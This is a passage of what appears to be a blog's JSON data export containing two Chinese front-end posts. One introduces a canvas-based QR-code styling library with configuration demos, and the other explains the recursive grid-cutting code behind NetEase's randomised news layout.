　},</div><div class=\"line\">　　background: {</div><div class=\"line\">　　　　<span class=\"string\">'0'</span>: <span class=\"string\">'rgb(233, 233, 233)'</span>,</div><div class=\"line\">　　　　<span class=\"string\">'0.2'</span>: <span class=\"string\">'rgb(246, 246, 246)'</span>,</div><div class=\"line\">　　　　<span class=\"string\">'1'</span>: <span class=\"string\">'rgb(212, 212, 212)'</span></div><div class=\"line\">　　},</div><div class=\"line\">　　shadow: <span class=\"literal\">true</span></div><div class=\"line\">});</div></pre></td></tr></table></figure>\n\n<p><strong>Demo Iron - “万紫千红总是春”</strong>      </p>\n<p>关键词：单点        </p>\n<p><img src=\"http://littendomo.sinaapp.com/kaer-qrcode/qrcode-point.jpg\" alt=\"demo\"></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">var</span> kaelPoint = <span class=\"keyword\">new</span> KaelQrcode();</div><div class=\"line\">kaelPoint.init(<span class=\"built_in\">document</span>.getElementById(<span class=\"string\">\"qr-point\"</span>), {</div><div class=\"line\">　　text : <span class=\"string\">\"hello KaelQrcode\"</span>,</div><div class=\"line\">　　size: <span class=\"number\">300</span>,</div><div class=\"line\">　　color: <span class=\"string\">\"#50528f\"</span>,</div><div class=\"line\">　　background: <span class=\"string\">\"e7e0cf\"</span>,</div><div class=\"line\">　　pointColor: <span class=\"string\">\"#ee256c\"</span>,</div><div class=\"line\">　　type: <span class=\"string\">\"round\"</span></div><div class=\"line\">});</div></pre></td></tr></table></figure>\n\n<h3 id=\"正在做_Todo：\">正在做 Todo：</h3>\n<ol>\n<li>阴影效果优化</li>\n<li>高光</li>\n<li>正方形识别</li>\n<li>动画</li>\n</ol>\n","source":"_posts/kael-qrcode-info.markdown","raw":"---\nlayout: post\ntitle: \"爱上一匹二维马可我家里没有草原…\"\ndate: 2014-08-01 23:52\ncomments: true\ntags: \n\t- html5 \n\t- 前端 \n\t- js \n\t- github\n---       \n\n#Kael-Qrcode \n\n> 基于html5 canvas，灵活轻巧，美观多变的二维码生成库                   \n\n一直觉得二维码长得太单一，抽空做了一个生成库：[github here](https://github.com/litten/Kael-Qrcode)。              \n取名卡尔，缘由dota英雄Kael；一生二，二生三，三生万物 ，简单地配置Kael-Qrcode，帮助你变换出无穷样式的二维码。        \n\n二维码不应只是那只黑白的斑马，它还可以是骏马野马海马河马草泥马…   \n<!-- more -->\n### 使用 Usage:\n\n**1、入手**\n\n**Demo Base - 基本**\n\n```js\n\tvar kaelBase = new KaelQrcode();\n\tkaelBase.init(document.getElementById(\"qr-base\"), \"hello KaelQrcode\");\n```\n\n**2、进阶**\n\n随手可配，变化无穷！           \n\n**Demo Pic - “有图有真相”**\n\n关键词：附图，图片边框，尺寸            \n\n![demo](http://littendomo.sinaapp.com/kaer-qrcode/qrcode-pic.jpg)\n```js\n\tvar kaelPic = new KaelQrcode();\n\tkaelBase.init(document.getElementById(\"qr-pic\"), {\n\t\ttext : \"hello KaelQrcode\",\n\t\tsize: 300,\n\t\timg: {\n\t\t\tsrc : \"kael-ico.jpg\",\n\t\t\tborder: \"#fff\"\n\t\t}\n\t});\n```\n**Demo Sae - “如果大海能够带走我的哀愁”**        \n\n关键词：圆角，前景色，背景色，渐变           \n\n![demo](http://littendomo.sinaapp.com/kaer-qrcode/qrcode-sea.jpg)\n```js\n\tvar kaelSea = new KaelQrcode();\n\tkaelSea.init(document.getElementById(\"qr-sea\"), {\n\t\ttext : \"hello KaelQrcode\",\n\t\tsize: 300,\n\t\tcolor: {\n\t\t\t'0': 'rgb(1, 158, 213)',\n\t\t\t'0.2': 'rgb(30, 169, 224)',\n\t\t\t'0.6': 'rgb(0, 120, 191)',\n\t\t\t'1': 'rgb(1, 119, 255)'\n\t\t},\n\t\tbackground: \"#d3e3f0\",\n\t\ttype: \"round\"\n\t});\n```\n\n**Demo Iron - “钢铁是怎样炼成的”**     \n\n关键词：阴影            \n\n![demo](http://littendomo.sinaapp.com/kaer-qrcode/qrcode-iron.jpg)\n```js\n\tvar kaelIron = new KaelQrcode();\n\tkaelIron.init(document.getElementById(\"qr-iron\"), {\n\t\ttext : \"hello KaelQrcode\",\n\t\tsize: 300,\n\t\tcolor: {\n\t\t\t'0': 'rgb(30, 30, 30)',\n\t\t\t'0.2': 'rgb(100, 100, 100)',\n\t\t\t'1': 'rgb(40, 40, 40)'\n\t\t},\n\t\tbackground: {\n\t\t\t'0': 'rgb(233, 233, 233)',\n\t\t\t'0.2': 'rgb(246, 246, 246)',\n\t\t\t'1': 'rgb(212, 212, 212)'\n\t\t},\n\t\tshadow: true\n\t});\n```\n**Demo Iron - “万紫千红总是春”**      \n\n关键词：单点        \n\n![demo](http://littendomo.sinaapp.com/kaer-qrcode/qrcode-point.jpg)\n```js\n\tvar kaelPoint = new KaelQrcode();\n\tkaelPoint.init(document.getElementById(\"qr-point\"), {\n\t\ttext : \"hello KaelQrcode\",\n\t\tsize: 300,\n\t\tcolor: \"#50528f\",\n\t\tbackground: \"e7e0cf\",\n\t\tpointColor: \"#ee256c\",\n\t\ttype: \"round\"\n\t});\n```\n\n### 正在做 Todo：\n\n1. 阴影效果优化\n2. 高光\n3. 正方形识别\n4. 动画","slug":"kael-qrcode-info","updated":1409364775000,"excerpt":"<h1 id=\"Kael-Qrcode\">Kael-Qrcode</h1>\n<blockquote>\n<p>基于html5 canvas，灵活轻巧，美观多变的二维码生成库                   </p>\n</blockquote>\n<p>一直觉得二维码长得太单一，抽空做了一个生成库：<a href=\"https://github.com/litten/Kael-Qrcode\" target=\"_blank\" rel=\"external\">github here</a>。<br>取名卡尔，缘由dota英雄Kael；一生二，二生三，三生万物 ，简单地配置Kael-Qrcode，帮助你变换出无穷样式的二维码。        </p>\n<p>二维码不应只是那只黑白的斑马，它还可以是骏马野马海马河马草泥马…<br>","_id":"375osx67p0wu5lih","categories":[],"photos":[],"link":""},{"layout":"post","title":"网易“聚合阅读”布局的实现","date":1367549700000,"comments":true,"tags":["w6w1sbbrofyval78"],"content":"<p><img src=\"/assets/blogImg/myReader0.jpg\" alt=\"聚合阅读\">   </p>\n<p>网易<a href=\"http://news.tag.163.com/\" target=\"_blank\" rel=\"external\">聚合阅读</a>的出现的确让人惊艳了一下。流畅的交互,使碎片化的新闻资讯像报纸一样摊在眼前,这是信息大爆炸的时代产物。不管你能不能接受这种新阅读形式，事实上，每天越来越多的新闻层出不穷，还没被人看到就已成为了“旧闻”。回归报纸的版面设计，堆叠新闻模块，让用户告别一条接一条整齐的新闻链接，而是在一个版面上提供更多的信息，不失为一种尝试。</p>\n<p>而抛去产品的层面，从前端方向来看，“聚合阅读”也有许多值得学习的地方。这几天研究了一下源码，谈谈它随机布局的实现，以及一些优化的措施。</p>\n<h2 id=\"demo\"><strong>demo</strong></h2>\n<p>点击按钮可以改变布局：<br><a id=\"more\"></a></p>\n<iframe id=\"demoIframe\" src=\"/assets/demo/my_news_reader/index.html\" width=\"600\" height=\"420\" scrolling=\"no\"></iframe>\n\n<h2 id=\"一-怎样定义格子对象\"><strong>一.怎样定义格子对象</strong></h2>\n<p>每个格子对象，都至少应该有这5个属性：   </p>\n<ul>\n<li>left：距离左边界的位置         </li>\n<li>top：距离上边界的位置           </li>\n<li>width：格子宽度             </li>\n<li>height：格子高度            </li>\n<li>background：格子颜色        </li>\n</ul>\n<p>逐个去定义对象无疑是愚蠢的： </p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Block</span><span class=\"params\">(o)</span></span>{</div><div class=\"line\">　　<span class=\"keyword\">return</span>{</div><div class=\"line\">　　　　left: o.left,</div><div class=\"line\">　　　　top: o.top,</div><div class=\"line\">　　　　width: o.width,</div><div class=\"line\">　　　　height: o.height,</div><div class=\"line\">　　　　bg: o.bg</div><div class=\"line\">　　}</div><div class=\"line\">}</div><div class=\"line\"><span class=\"keyword\">var</span> block1 = <span class=\"keyword\">new</span> Block({</div><div class=\"line\">　　left: <span class=\"number\">0</span>,</div><div class=\"line\">　　top: <span class=\"number\">0</span>,</div><div class=\"line\">　　width: <span class=\"number\">50</span>,</div><div class=\"line\">　　height: <span class=\"number\">50</span>,</div><div class=\"line\">　　bg: <span class=\"string\">\"#3f3\"</span></div><div class=\"line\">});</div><div class=\"line\"><span class=\"keyword\">var</span> block2 = …</div><div class=\"line\">…</div><div class=\"line\"><span class=\"keyword\">var</span> block37 = …</div></pre></td></tr></table></figure>\n\n<p>这样不仅不利于后期维护，而且构造格子的嵌套关系也相对麻烦。</p>\n<p>网易的做法是使用“交替切割”的方式来做：         </p>\n<ol>\n<li>将大块先切成两列。         </li>\n<li>左列（红色部分）再切成三行，右列（褐，黄，蓝部分）也切成三行。</li>\n<li>对形成的6个小块，再进行列的切割</li>\n</ol>\n<p>整个做法就是“列-行-列-行-……”这样的交替切割。所以它的对象是这样设置的,其中random属性可以约定同级的cols或rows是否可以随机变换位置，width和height的值是规定一个父级块的分割比例。其设置的形式例如（例子与demo的设定无关）：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">window</span>.tagConfig.pageLayout = {</div><div class=\"line\">　　top: <span class=\"number\">0</span>,</div><div class=\"line\">　　left: <span class=\"number\">0</span>,</div><div class=\"line\">　　width: <span class=\"number\">100</span>,</div><div class=\"line\">　　height: <span class=\"number\">100</span>,</div><div class=\"line\">　　random: !<span class=\"number\">1</span>,</div><div class=\"line\">　　cols: [{</div><div class=\"line\">　　　　width: <span class=\"number\">30</span>,</div><div class=\"line\">　　　　rows: [{</div><div class=\"line\">　　　　　　height: <span class=\"number\">40</span>,</div><div class=\"line\">　　　　　　cols: [{</div><div class=\"line\">　　　　　　　　width: <span class=\"number\">30</span>,</div><div class=\"line\">　　　　　　　　rows:[{</div><div class=\"line\">　　　　　　　　　　height:<span class=\"number\">100</span></div><div class=\"line\">　　　　　　　　}]</div><div class=\"line\">　　　　　　},{</div><div class=\"line\">　　　　　　　　width: <span class=\"number\">70</span>,</div><div class=\"line\">　　　　　　　　rows:[{</div><div class=\"line\">　　　　　　　　　　height:<span class=\"number\">100</span></div><div class=\"line\">　　　　　　　　}]</div><div class=\"line\">　　　　　　}]</div><div class=\"line\">　　　　},</div><div class=\"line\">　　　　{</div><div class=\"line\">　　　　　　height: <span class=\"number\">30</span></div><div class=\"line\">　　　　},{</div><div class=\"line\">　　　　　　height: <span class=\"number\">30</span></div><div class=\"line\">　　　　}]</div><div class=\"line\">　　},{</div><div class=\"line\">　　　　width: <span class=\"number\">70</span>,</div><div class=\"line\">　　　　rows:[{</div><div class=\"line\">　　　　　　height:<span class=\"number\">100</span></div><div class=\"line\">　　　　}]</div><div class=\"line\">　　}]</div><div class=\"line\">}</div></pre></td></tr></table></figure>\n\n<h2 id=\"二-递归调用切割函数\"><strong>二.递归调用切割函数</strong></h2>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">_getGrids</span><span class=\"params\">(tag)</span> </span>{</div><div class=\"line\">　　<span class=\"comment\">/*domArr是拥有left,top,width,height,bg等属性的所有dom数组，_getGrids的最终目的就是生成这个数组*/</span></div><div class=\"line\">　　<span class=\"keyword\">var</span> domArr = [],</div><div class=\"line\">　　_cutGrid(tag.pageLayout,</div><div class=\"line\">　　　　<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">(tag)</span> </span>{</div><div class=\"line\">　　　　　　<span class=\"keyword\">if</span> (tag.rows || tag.cols) {</div><div class=\"line\">　　　　　　　　<span class=\"comment\">/*假如子级存在rows或者cols，则递归切割*/</span></div><div class=\"line\">　　　　　　　　_cutGrid(tag, <span class=\"built_in\">arguments</span>.callee);</div><div class=\"line\">　　　　　　}</div><div class=\"line\">　　　　　　<span class=\"keyword\">else</span> {</div><div class=\"line\">　　　　　　　　<span class=\"comment\">/*子级不存在rows或者cols，不再进行切割，构造domArr*/</span></div><div class=\"line\">　　　　　　　　…</div><div class=\"line\">　　　　　　　　domArr.push(xxx)</div><div class=\"line\">　　　　　　　　…</div><div class=\"line\">　　　　　　}</div><div class=\"line\">　　　　}</div><div class=\"line\">　　);</div><div class=\"line\">　　<span class=\"keyword\">return</span> domArr;</div><div class=\"line\">}</div></pre></td></tr></table></figure>\n\n<h2 id=\"三-切割函数\"><strong>三.切割函数</strong></h2>\n<p>切割函数挺有意思的，下次想再用一篇文章来详细写一下，在这里仅贴出参考的源码。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">/*对象复制函数*/</span></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">_shadowClone</span><span class=\"params\">(e)</span> </span>{</div><div class=\"line\">　　<span class=\"keyword\">var</span> t = {};</div><div class=\"line\">　　<span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> n <span class=\"keyword\">in</span> e) e.hasOwnProperty(n) && (t[n] = e[n]);</div><div class=\"line\">　　<span class=\"keyword\">return</span> t;</div><div class=\"line\">}</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/*判断子块随机布局与否*/</span></div><div class=\"line\">(<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span> </span>{</div><div class=\"line\">　　<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">ranOrNot</span><span class=\"params\">(e, t)</span> </span>{</div><div class=\"line\">　　　　<span class=\"keyword\">var</span> n = [];</div><div class=\"line\">　　　　<span class=\"keyword\">typeof</span> t == <span class=\"string\">\"undefined\"</span> && (t = e, e = <span class=\"number\">0</span>);</div><div class=\"line\">　　　　<span class=\"keyword\">for</span> (; e &lt; t; e++) n.push(e);</div><div class=\"line\">　　　　<span class=\"keyword\">return</span> n</div><div class=\"line\">　　}</div><div class=\"line\">　　<span class=\"comment\">/*随机布局*/</span></div><div class=\"line\">　　<span class=\"built_in\">Array</span>.prototype.randomEach = <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">(t)</span> </span>{</div><div class=\"line\">　　　　<span class=\"built_in\">console</span>.log(<span class=\"number\">3</span>);</div><div class=\"line\">　　　　<span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> t != <span class=\"string\">\"function\"</span>) <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"built_in\">TypeError</span>;</div><div class=\"line\">　　　　<span class=\"keyword\">var</span> n = <span class=\"keyword\">this</span>.length,</div><div class=\"line\">　　　　r = ranOrNot(n);</div><div class=\"line\">　　　　<span class=\"keyword\">while</span> (n) {</div><div class=\"line\">　　　　　　<span class=\"keyword\">var</span> i = <span class=\"built_in\">Math</span>.floor(<span class=\"built_in\">Math</span>.random() * n--);</div><div class=\"line\">　　　　　　<span class=\"keyword\">if</span> (t(<span class=\"keyword\">this</span>[r[i]]) === !<span class=\"number\">1</span>) <span class=\"keyword\">break</span>;</div><div class=\"line\">　　　　　　r[i] = r[n]</div><div class=\"line\">　　　　}</div><div class=\"line\">　　},</div><div class=\"line\">　　<span class=\"comment\">/*常规布局*/</span></div><div class=\"line\">　　<span class=\"built_in\">Array</span>.prototype.forEach || (<span class=\"built_in\">Array</span>.prototype.forEach = <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">(e)</span> </span>{</div><div class=\"line\">　　　　<span class=\"keyword\">var</span> t = <span class=\"keyword\">this</span>.length;</div><div class=\"line\">　　　　<span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> e != <span class=\"string\">\"function\"</span>) <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"built_in\">TypeError</span>;</div><div class=\"line\">　　　　<span class=\"keyword\">var</span> n = <span class=\"built_in\">arguments</span>[<span class=\"number\">1</span>];</div><div class=\"line\">　　　　<span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> r = <span class=\"number\">0</span>; r &lt; t; r++) r <span class=\"keyword\">in</span> <span class=\"keyword\">this</span> && e.call(n, <span class=\"keyword\">this</span>[r], r, <span class=\"keyword\">this</span>)</div><div class=\"line\">　　})</div><div class=\"line\">} )();</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/*切割函数*/</span></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">_cutGrid</span><span class=\"params\">(tag, funcJudge)</span> </span>{</div><div class=\"line\">　　<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">a</span><span class=\"params\">(a)</span> </span>{</div><div class=\"line\">　　　　<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">h</span><span class=\"params\">(cutLength)</span> </span>{</div><div class=\"line\">　　　　　　<span class=\"comment\">/*复制子块对象并计算出子块top,left*/</span></div><div class=\"line\">　　　　　　<span class=\"keyword\">var</span> u, a = _shadowClone(cutLength);</div><div class=\"line\">　　　　　　c++,</div><div class=\"line\">　　　　　　u = c === l ? tag[cutType2.measure] - s: <span class=\"built_in\">Math</span>.floor(cutLength[cutType2.measure] * tag[cutType2.measure] / <span class=\"number\">100</span>),</div><div class=\"line\">　　　　　　a[cutType1.offset] = i + tag[cutType1.offset],</div><div class=\"line\">　　　　　　a[cutType2.offset] = s + tag[cutType2.offset],</div><div class=\"line\">　　　　　　a[cutType1.measure] = f,</div><div class=\"line\">　　　　　　a[cutType2.measure] = u,</div><div class=\"line\">　　　　　　a.colorPattern = tag.colorPattern,</div><div class=\"line\">　　　　　　<span class=\"comment\">/*判断小块是否还需要分割*/</span></div><div class=\"line\">　　　　　　funcJudge(a),</div><div class=\"line\">　　　　　　s += u</div><div class=\"line\">　　　　}</div><div class=\"line\">　　　　<span class=\"keyword\">var</span> f, l = a[cutType2.name].length,</div><div class=\"line\">　　　　c = <span class=\"number\">0</span>;</div><div class=\"line\">　　　　u++,</div><div class=\"line\">　　　　f = u === cutLength ? tag[cutType1.measure] - i: <span class=\"built_in\">Math</span>.floor(a[cutType1.measure] * tag[cutType1.measure] / <span class=\"number\">100</span>),</div><div class=\"line\">　　　　a.random === !<span class=\"number\">1</span> ? a[cutType2.name].forEach(h) : a[cutType2.name].randomEach(h),</div><div class=\"line\">　　　　s = <span class=\"number\">0</span>,</div><div class=\"line\">　　　　i += f</div><div class=\"line\">　　}</div><div class=\"line\">　　<span class=\"comment\">/*根据大块是否有rows属性，定义两种切割方式*/</span></div><div class=\"line\">　　<span class=\"keyword\">var</span> cutType1, cutType2;</div><div class=\"line\">　　tag.rows ? (cutType1 = {</div><div class=\"line\">　　　　name: <span class=\"string\">\"rows\"</span>,</div><div class=\"line\">　　　　measure: <span class=\"string\">\"height\"</span>,</div><div class=\"line\">　　　　offset: <span class=\"string\">\"top\"</span></div><div class=\"line\">　　},</div><div class=\"line\">　　cutType2 = {</div><div class=\"line\">　　　　name: <span class=\"string\">\"cols\"</span>,</div><div class=\"line\">　　　　measure: <span class=\"string\">\"width\"</span>,</div><div class=\"line\">　　　　offset: <span class=\"string\">\"left\"</span></div><div class=\"line\">　　}) : (cutType1 = {</div><div class=\"line\">　　　　name: <span class=\"string\">\"cols\"</span>,</div><div class=\"line\">　　　　measure: <span class=\"string\">\"width\"</span>,</div><div class=\"line\">　　　　offset: <span class=\"string\">\"left\"</span></div><div class=\"line\">　　},</div><div class=\"line\">　　cutType2 = {</div><div class=\"line\">　　　　name: <span class=\"string\">\"rows\"</span>,</div><div class=\"line\">　　　　measure: <span class=\"string\">\"height\"</span>,</div><div class=\"line\">　　　　offset: <span class=\"string\">\"top\"</span></div><div class=\"line\">　　});</div><div class=\"line\">　　<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>,</div><div class=\"line\">　　s = <span class=\"number\">0</span>,</div><div class=\"line\">　　cutLength = tag[cutType1.name].length,</div><div class=\"line\">　　u = <span class=\"number\">0</span>;</div><div class=\"line\">　　<span class=\"comment\">/*是否随机布局*/</span></div><div class=\"line\">　　tag.random === !<span class=\"number\">1</span> ? tag[cutType1.name].forEach(a) : tag[cutType1.name].randomEach(a)</div><div class=\"line\">}</div></pre></td></tr></table></figure>\n\n<h2 id=\"四-最后\"><strong>四.最后</strong></h2>\n<p>完成到这一步，我已不记得声明对象时出了多少次错误。各种尖括号，方括号，逗号和分号翩翩起舞时，你一定跟我一样很想念coffee的语法糖…</p>\n","source":"_posts/my-news-reader-box.markdown","raw":"---\nlayout: post\ntitle: \"网易“聚合阅读”布局的实现\"\ndate: 2013-05-03 10:55\ncomments: true\ntags: \n\t- js\n---       \n![聚合阅读](/assets/blogImg/myReader0.jpg)   \n\n网易[聚合阅读](http://news.tag.163.com/)的出现的确让人惊艳了一下。流畅的交互,使碎片化的新闻资讯像报纸一样摊在眼前,这是信息大爆炸的时代产物。不管你能不能接受这种新阅读形式，事实上，每天越来越多的新闻层出不穷，还没被人看到就已成为了“旧闻”。回归报纸的版面设计，堆叠新闻模块，让用户告别一条接一条整齐的新闻链接，而是在一个版面上提供更多的信息，不失为一种尝试。\n\n而抛去产品的层面，从前端方向来看，“聚合阅读”也有许多值得学习的地方。这几天研究了一下源码，谈谈它随机布局的实现，以及一些优化的措施。\n\n##**demo**\n\n点击按钮可以改变布局：\n<!--more-->\n\n<iframe id=\"demoIframe\" src=\"/assets/demo/my_news_reader/index.html\" width=\"600\" height=\"420\" scrolling=\"no\"></iframe>\n\n##**一.怎样定义格子对象**\n\n每个格子对象，都至少应该有这5个属性：   \n\n+ left：距离左边界的位置         \n+ top：距离上边界的位置           \n+ width：格子宽度             \n+ height：格子高度            \n+ background：格子颜色        \n\n逐个去定义对象无疑是愚蠢的： \n```js \n\tfunction Block(o){\n\t\treturn{\n\t\t\tleft: o.left,\n\t\t\ttop: o.top,\n\t\t\twidth: o.width,\n\t\t\theight: o.height,\n\t\t\tbg: o.bg\n\t\t}\n\t}\n\tvar block1 = new Block({\n\t\tleft: 0,\n\t\ttop: 0,\n\t\twidth: 50,\n\t\theight: 50,\n\t\tbg: \"#3f3\"\n\t});\n\tvar block2 = …\n\t…\n\tvar block37 = …\n```\n这样不仅不利于后期维护，而且构造格子的嵌套关系也相对麻烦。\n\n网易的做法是使用“交替切割”的方式来做：         \n1. 将大块先切成两列。         \n2. 左列（红色部分）再切成三行，右列（褐，黄，蓝部分）也切成三行。\n3. 对形成的6个小块，再进行列的切割\n\n整个做法就是“列-行-列-行-……”这样的交替切割。所以它的对象是这样设置的,其中random属性可以约定同级的cols或rows是否可以随机变换位置，width和height的值是规定一个父级块的分割比例。其设置的形式例如（例子与demo的设定无关）：\n```js \n\twindow.tagConfig.pageLayout = {\n\t\ttop: 0,\n\t\tleft: 0,\n\t\twidth: 100,\n\t\theight: 100,\n\t\trandom: !1,\n\t\tcols: [{\n\t\t\twidth: 30,\n\t\t\trows: [{\n\t\t\t\theight: 40,\n\t\t\t\tcols: [{\n\t\t\t\t\twidth: 30,\n\t\t\t\t\trows:[{\n\t\t\t\t\t\theight:100\n\t\t\t\t\t}]\n\t\t\t\t},{\n\t\t\t\t\twidth: 70,\n\t\t\t\t\trows:[{\n\t\t\t\t\t\theight:100\n\t\t\t\t\t}]\n\t\t\t\t}]\n\t\t\t},\n\t\t\t{\n\t\t\t\theight: 30\n\t\t\t},{\n\t\t\t\theight: 30\n\t\t\t}]\n\t\t},{\n\t\t\twidth: 70,\n\t\t\trows:[{\n\t\t\t\theight:100\n\t\t\t}]\n\t\t}]\n\t}\n```\n##**二.递归调用切割函数**\n```js \n\tfunction _getGrids(tag) {\n\t\t/*domArr是拥有left,top,width,height,bg等属性的所有dom数组，_getGrids的最终目的就是生成这个数组*/\n\t\tvar domArr = [],\n\t\t_cutGrid(tag.pageLayout,\n\t\t\tfunction(tag) {\n\t\t\t\tif (tag.rows || tag.cols) {\n\t\t\t\t\t/*假如子级存在rows或者cols，则递归切割*/\n\t\t\t\t\t_cutGrid(tag, arguments.callee);\n\t\t\t\t}\n\t\t\t\telse {\n\t\t\t\t\t/*子级不存在rows或者cols，不再进行切割，构造domArr*/\n\t\t\t\t\t…\n\t\t\t\t\tdomArr.push(xxx)\n\t\t\t\t\t…\n\t\t\t\t}\n\t\t\t}\n\t\t);\n\t\treturn domArr;\n\t}\n```\n##**三.切割函数**\n\n切割函数挺有意思的，下次想再用一篇文章来详细写一下，在这里仅贴出参考的源码。\n```js \n\t/*对象复制函数*/\n\tfunction _shadowClone(e) {\n\t\tvar t = {};\n\t\tfor (var n in e) e.hasOwnProperty(n) && (t[n] = e[n]);\n\t\treturn t;\n\t}\n\n\t/*判断子块随机布局与否*/\n\t(function() {\n\t\tfunction ranOrNot(e, t) {\n\t\t\tvar n = [];\n\t\t\ttypeof t == \"undefined\" && (t = e, e = 0);\n\t\t\tfor (; e < t; e++) n.push(e);\n\t\t\treturn n\n\t\t}\n\t\t/*随机布局*/\n\t\tArray.prototype.randomEach = function(t) {\n\t\t\tconsole.log(3);\n\t\t\tif (typeof t != \"function\") throw new TypeError;\n\t\t\tvar n = this.length,\n\t\t\tr = ranOrNot(n);\n\t\t\twhile (n) {\n\t\t\t\tvar i = Math.floor(Math.random() * n--);\n\t\t\t\tif (t(this[r[i]]) === !1) break;\n\t\t\t\tr[i] = r[n]\n\t\t\t}\n\t\t},\n\t\t/*常规布局*/\n\t\tArray.prototype.forEach || (Array.prototype.forEach = function(e) {\n\t\t\tvar t = this.length;\n\t\t\tif (typeof e != \"function\") throw new TypeError;\n\t\t\tvar n = arguments[1];\n\t\t\tfor (var r = 0; r < t; r++) r in this && e.call(n, this[r], 